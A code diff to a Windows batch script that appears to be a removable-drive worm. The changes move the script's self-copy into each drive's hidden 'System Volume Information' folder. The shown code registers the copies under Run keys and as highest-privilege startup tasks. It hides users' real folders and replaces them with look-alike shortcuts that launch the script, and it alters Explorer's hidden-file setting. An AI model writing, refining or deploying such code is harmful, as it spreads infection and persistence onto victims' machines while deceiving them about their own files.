@@ -98,8 +98,6 @@ attrib +r +s "%~dpnx0"
 :cycle
 if exist "%path_desktop%\09.11.2001" goto :remover
 
-
-
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"    /v Hidden /t REG_DWORD /d 2 /f >nul
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29     /t REG_SZ    /d "%windir%\System32\shell32.dll,-50" /f >nul
 
@@ -138,45 +136,42 @@ for %%i in (localAppData appData) do (
 
 
 
-for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
-  if exist "%%i:\" (
-    if exist "%%i:\%~nx0" (
-      attrib +r +s "%%i:\%~nx0"
-      (
-        %module_fileTouch% /w /a /c /d %app_date% "%%i:\%~nx0"
-        reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
-        reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
-        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
-        reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%~nx0" /f
-        schtasks /create /sc onstart /tn "%app_name% %%i" /tr "%%i:\%~nx0" /f /rl highest
-      )>nul 2>nul
 
-      if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
-        for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
-          if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-            attrib +h +s "%%i:\%%x"
 
-            if not exist "%%i:\%%x.lnk" (
-              set counter=0
-              for /f "delims=" %%y in ('dir "%%i:\%%x\*" /b 2^>nul') do set /a counter+=1
-              if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
-              ) else set icon=%WinDir%\System32\imageres.dll,153
-              if exist "%%i:\%%x\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i:\%%x\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
-              %module_shortcut% /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"--key_target="""%%i:\%%x"""" /i:"!icon!"
-            )
-          )
-        )
-      ) else (
-        for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
-          if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-            attrib -h -s "%%i:\%%x"
-            if exist "%%i:\%%x.lnk" del /q "%%i:\%%x.lnk"
-          )
-        )
-      )
+for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do if exist "%%i:\" if /i "%%i:" NEQ "%systemDrive%" if /i "%%i:" NEQ "D:" (
+  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
+    if /i "%%j" == "System Volume Information" if not exist "%%i:\%%j\%~nx0" (
+      copy /y "%~dpnx0" "%%i:\%%j\"
+      if exist "%%i:\%%j\%~nx0" attrib +r +s "%%i:\%%j\%~nx0"
     ) else (
-      copy /y "%~dpnx0" %%i:\
-      if exist "%%i:\%~nx0" call attrib +r +s "%%i:\%~nx0"
+      attrib +r +s "%%i:\%%j\%~nx0"
+      (
+        %module_fileTouch% /w /a /c /d %app_date% "%%i:\%%j\%~nx0"
+        reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
+        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
+        reg add HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
+        reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
+        schtasks /create /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
+      )>nul 2>nul
+    )
+
+    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+      attrib +h +s "%%i:\%%j"
+      if not exist "%%i:\%%j.lnk" (
+        set counter=0
+        for /f "delims=" %%y in ('dir "%%i:\%%j\*" /b 2^>nul') do set /a counter+=1
+        if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
+        ) else set icon=%WinDir%\System32\imageres.dll,153
+        if exist "%%i:\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i:\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
+        %module_shortcut% /a:c /f:"%%i:\%%j.lnk" /t:"%%i:\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
+      )
+    )
+  )
+) else (
+  for /f "delims=" %%j in ('dir "%%i:\*" /a:d /b 2^>nul') do (
+    if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+      attrib -h -s "%%i:\%%j"
+      if exist "%%i:\%%j.lnk" del /q "%%i:\%%j.lnk"
     )
   )
 )
@@ -236,8 +231,6 @@ goto :cycle
 
 :remover
 reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 29 /f >nul
-
-
 
 if exist "%path_autoRun1%\%~nx0" (
   attrib -h -r -s "%path_autoRun1%\%~nx0"
